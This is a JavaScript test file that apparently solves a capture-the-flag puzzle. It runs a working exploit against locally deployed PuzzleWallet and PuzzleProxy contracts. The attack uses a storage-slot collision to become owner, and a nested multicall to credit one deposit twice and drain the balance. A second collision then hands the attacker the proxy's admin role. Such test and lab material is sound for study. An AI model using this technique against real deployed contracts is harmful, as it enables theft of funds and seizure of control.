import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { ethers } from "ethers";
import { readFile } from "node:fs/promises";

const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

const walletArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/PuzzleWallet.sol/PuzzleWallet.json",
    "utf8"
  )
);

const proxyArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/PuzzleWallet.sol/PuzzleProxy.json",
    "utf8"
  )
);

let admin;
let attacker;
let wallet;
let proxy;

beforeEach(async () => {
  admin = await provider.getSigner(0);
  attacker = await provider.getSigner(1);

  const walletFactory = new ethers.ContractFactory(
    walletArtifact.abi,
    walletArtifact.bytecode,
    admin
  );

  wallet = await walletFactory.deploy();
  await wallet.waitForDeployment();

  const proxyFactory = new ethers.ContractFactory(
    proxyArtifact.abi,
    proxyArtifact.bytecode,
    admin
  );

  const initData = wallet.interface.encodeFunctionData("init", [
    ethers.parseEther("0.01"),
  ]);

  proxy = await proxyFactory.deploy(
    await admin.getAddress(),
    await wallet.getAddress(),
    initData
  );

  await proxy.waitForDeployment();

  const walletAtProxyAdmin = new ethers.Contract(
    await proxy.getAddress(),
    walletArtifact.abi,
    admin
  );

  await (
    await walletAtProxyAdmin.addToWhitelist(
      await admin.getAddress()
    )
  ).wait();

  await (
    await walletAtProxyAdmin.deposit({
      value: ethers.parseEther("0.001"),
    })
  ).wait();
});

test("takes over PuzzleProxy admin through storage collision and multicall", async () => {
  const proxyAddress = await proxy.getAddress();
  const attackerAddress = await attacker.getAddress();

  // Interact with the proxy using the implementation ABI.
  const walletAtProxy = new ethers.Contract(
    proxyAddress,
    walletArtifact.abi,
    attacker
  );

  const proxyAsAttacker = new ethers.Contract(
    proxyAddress,
    proxyArtifact.abi,
    attacker
  );

  // Slot 0: pendingAdmin overlaps with PuzzleWallet.owner.
  await (
    await proxyAsAttacker.proposeNewAdmin(attackerAddress)
  ).wait();

  assert.equal(
    await walletAtProxy.owner(),
    attackerAddress
  );

  await (
    await walletAtProxy.addToWhitelist(attackerAddress)
  ).wait();

  // Encode deposit once, then nest multicall to bypass depositCalled.
  const depositData = walletAtProxy.interface.encodeFunctionData(
    "deposit"
  );

  const nestedMulticallData =
    walletAtProxy.interface.encodeFunctionData("multicall", [
      [depositData],
    ]);

  // The same msg.value is credited twice, but sent only once.
  await (
    await walletAtProxy.multicall(
      [depositData, nestedMulticallData],
      { value: ethers.parseEther("0.001") }
    )
  ).wait();

  assert.equal(
    await walletAtProxy.balances(attackerAddress),
    ethers.parseEther("0.002")
  );

  // Withdraw the full proxy balance using the inflated accounting balance.
  await (
    await walletAtProxy.execute(
      attackerAddress,
      ethers.parseEther("0.002"),
      "0x"
    )
  ).wait();

  assert.equal(
    await provider.getBalance(proxyAddress),
    0n
  );

  // Slot 1: maxBalance overlaps with PuzzleProxy.admin.
  await (
    await walletAtProxy.setMaxBalance(BigInt(attackerAddress))
  ).wait();

  assert.equal(
    await proxyAsAttacker.admin(),
    attackerAddress
  );
});
